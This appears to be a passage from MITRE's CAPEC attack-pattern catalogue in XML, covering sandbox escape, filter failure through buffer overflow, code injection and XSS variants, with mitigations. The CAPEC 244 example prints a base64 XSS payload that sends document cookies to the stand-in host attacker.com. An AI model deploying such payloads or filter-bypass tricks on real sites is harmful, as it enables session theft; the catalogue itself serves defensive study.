         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="68"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="115"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Probing] The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.</Description>
               <Technique>The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Analysis] The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.</Description>
               <Technique>The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Verify the exploitable security weaknesses] The attacker tries to craft malicious signed code from another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.</Description>
               <Technique>The attacker tries to explore the security weaknesses by calling malicious signed code from another language allowed by the sandbox.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Exploit the security weaknesses in the standard libraries] The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.</Description>
               <Technique>The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>A framework-based language that supports code signing and sandbox (such as Java, .Net, JavaScript, and Flash) Deployed code that has been signed by its authoring vendor, or a partner</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The attacker must have a good knowledge of the platform specific mechanisms of signing and verifying code. Most code signing and verification schemes are based on use of cryptography, the attacker needs to have an understand of these cryptographic operations in good detail.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Assurance: Sanitize the code of the standard libraries to make sure there is no security weaknesses in them.</Mitigation>
            <Mitigation>Design: Use obfuscation and other techniques to prevent reverse engineering the standard libraries.</Mitigation>
            <Mitigation>Assurance: Use static analysis tool to do code review and dynamic tool to do penetration test on the standard library.</Mitigation>
            <Mitigation>Configuration: Get latest updates for the computer.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Exploit: Java/ByteVerify.C is a detection of malicious code that attempts to exploit a vulnerability in the Microsoft Virtual Machine (VM). The VM enables Java programs to run on Windows platforms. The Microsoft Java VM is included in most versions of Windows and Internet Explorer. In some versions of the Microsoft VM, a vulnerability exists because of a flaw in the way the ByteCode Verifier checks code when it is initially being loaded by the Microsoft VM. The ByteCode Verifier is a low level process in the Microsoft VM that is responsible for checking the validity of code - or byte code - as it is initially being loaded into the Microsoft VM. Java/ByteVerify.C attempts to download a file named "msits.exe", located in the same virtual directory as the Java applet, into the Windows system folder, and with a random file name. It then tries to execute this specific file. This flaw enables attackers to execute arbitrary code on a user's machine such as writing, downloading and executing additional malware. This vulnerability is addressed by update MS03-011, released in 2003.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-91"/>
            <Reference External_Reference_ID="REF-92" Section="Exploit: Java/ByteVerify.C"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, References</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Calling Signed Code From Another Language Within A Sandbox Allow This</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="24" Name="Filter Failure through Buffer Overflow" Abstraction="Detailed" Status="Draft">
         <Description>In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey] The attacker surveys the target application, possibly as a valid and authenticated user</Description>
               <Technique>Spidering web sites for inputs that involve potential filtering</Technique>
               <Technique>Brute force guessing of filtered inputs</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.</Description>
               <Technique>Brute force attack through black box penetration test tool.</Technique>
               <Technique>Fuzzing of communications protocols</Technique>
               <Technique>Manual testing of possible inputs with attack data.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?</Description>
               <Technique>Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.</Technique>
               <Technique>Check Log files. An attacker with access to log files can look at the outcome of bad input.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.</Description>
               <Technique>DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.</Technique>
               <Technique>Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.</Technique>
               <Technique>An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Ability to control the length of data passed to an active filter.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.</Skill>
            <Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.</Mitigation>
            <Mitigation>Pre-design: Use a language or compiler that performs automatic bounds checking.</Mitigation>
            <Mitigation>Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</Mitigation>
            <Mitigation>Operational: Use OS-level preventative functionality. Not a complete solution.</Mitigation>
            <Mitigation>Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Filter Failure in Taylor UUCP Daemon</xhtml:div>
               <xhtml:p>Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.</xhtml:p>
            </Example>
            <Example>A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.</Example>
            <Example>Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="118"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="733"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="240" Name="Resource Injection" Abstraction="Meta" Status="Stable">
         <Description>An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target application allows the user to both specify the identifier used to access a system resource. Through this permission, the user gains the capability to perform actions on that resource (e.g., overwrite the file)</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure all input content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Perform input validation for all content.</Mitigation>
            <Mitigation>Enforce regular patching of software.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="99"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="242" Name="Code Injection" Abstraction="Meta" Status="Stable">
         <Description>An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Code Injection attack patterns can result in a wide variety of consequences and negatively affect all three elements of the security triad.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Utilize strict type, character, and encoding enforcement</Mitigation>
            <Mitigation>Ensure all input content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Perform input validation for all content.</Mitigation>
            <Mitigation>Enforce regular patching of software.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="94"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="243" Name="XSS Targeting HTML Attributes" Abstraction="Detailed" Status="Draft">
         <Description>An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Use libraries and templates that minimize unfiltered input.</Mitigation>
            <Mitigation>Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.</Mitigation>
            <Mitigation>Implementation: The victim should configure the browser to minimize active content from untrusted sources.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="83"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-94"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Cross-Site Scripting in Attributes</Previous_Entry_Name>
            <Previous_Entry_Name Date="2018-07-31">XSS Targetting HTML Attributes</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="244" Name="XSS Targeting URI Placeholders" Abstraction="Detailed" Status="Draft">
         <Description>An attack of this type exploits the ability of most browsers to interpret "data", "javascript" or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</Description>
               <Technique>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt injection payload variations on input parameters] Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.</Description>
               <Technique>Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.</Technique>
               <Technique>Use a proxy tool to record results of manual input of XSS probes in known URLs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">To inject the malicious payload in a web page</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to send HTTP request to a web application</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Design: Utilize strict type, character, and encoding enforcement.</Mitigation>
            <Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content, including remote and user-generated content</Mitigation>
            <Mitigation>Implementation: Perform output validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Disable scripting languages such as JavaScript in browser</Mitigation>
            <Mitigation>Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The following payload data:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==</xhtml:div>
               <xhtml:p>represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser.</xhtml:p>
               <xhtml:p>The decoded payload is the following piece of HTML code:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;html&gt;<xhtml:div style="margin-left:10px;">&lt;body&gt;<xhtml:div style="margin-left:10px;">&lt;script&gt;<xhtml:div style="margin-left:10px;">var img = new Image();<xhtml:br/>img.src = "http://attacker.com/cookiegrabber?"+ encodeURIComponent(document.cookies);</xhtml:div>
                        <xhtml:br/>&lt;/script&gt;</xhtml:div>
                     <xhtml:br/>&lt;/body&gt;</xhtml:div>
                  <xhtml:br/>&lt;/html&gt;</xhtml:div>
               <xhtml:p>Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack.</xhtml:p>
               <xhtml:p>An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute):</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;a href="INJECTION_POINT"&gt;My Link&lt;/a&gt;</xhtml:div>
               <xhtml:p>Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="83"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-70" Section="Testing for Cross site scripting"/>
            <Reference External_Reference_ID="REF-96"/>
            <Reference External_Reference_ID="REF-97" Section="XSS Filter Evasion Cheat Sheet"/>
            <Reference External_Reference_ID="REF-72" Section="WASC-08 - Cross Site Scripting"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Cross-Site Scripting via Encoded URI Schemes</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="245" Name="XSS Using Doubled Characters" Abstraction="Detailed" Status="Draft">
         <Description>The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the &lt; before a script command, (&lt;&lt;script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted web application does not fully normalize input before checking for prohibited syntax. In particular, it must fail to recognize prohibited methods preceded by certain sequences of repeated characters.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Use libraries and templates that minimize unfiltered input.</Mitigation>
            <Mitigation>Implementation: Normalize, filter and sanitize all user supplied fields.</Mitigation>
            <Mitigation>Implementation: The victim should configure the browser to minimize active content from untrusted sources.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="85"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-99"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Cross-Site Scripting Using Doubled Characters, e.g. %3C%3Cscript</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="247" Name="XSS Using Invalid Characters" Abstraction="Detailed" Status="Draft">
         <Description>An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters.</Prerequisite>
